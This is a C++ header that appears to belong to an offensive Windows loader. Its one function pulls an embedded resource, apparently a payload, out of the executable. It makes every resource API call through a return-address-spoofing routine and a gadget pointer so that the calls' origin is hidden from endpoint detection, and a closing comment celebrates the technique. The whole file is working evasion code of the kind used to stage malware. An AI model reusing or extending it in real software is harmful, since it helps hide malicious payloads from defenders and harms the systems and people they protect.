#pragma once

#include "functions.h"
#include "retaddrspoof.h"
#include "resource1.h"

#include <windows.h>
#include <iostream>

extern PVOID Gdgt;

int GetFromRc(DWORD& size, PVOID& ptr) {

    HRSRC hResource = (HRSRC)RetSpoofCall((void*)e_FindResourceW , 3 , Gdgt, NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);

    if (hResource == NULL) {
        std::cout << "Failed To FindResource\n";
    }


    HGLOBAL hGlobal = (HGLOBAL)RetSpoofCall((void*)e_LoadResource, 2, Gdgt, NULL, hResource);

    if (hGlobal == NULL) {
        std::cout << "Failed To LoadResource\n";
    }


    PVOID pResource = RetSpoofCall((void*)e_LockResource, 1, Gdgt, hGlobal);

    if (pResource == NULL) {
        std::cout << "Failed To LockResource\n";
    }

    DWORD Size = (DWORD)RetSpoofCall((void*)e_SizeofResource, 2, Gdgt, NULL, hResource);

#ifdef _DEBUG_PRINT

    std::cout << "[DEBUG] Retrieved Resource Size: " << Size << "\n";

#endif
    ptr = pResource;
    size = Size;

    /* I LOVE RETURN ADDRESS SPOOFING <3 */

    return 0;
}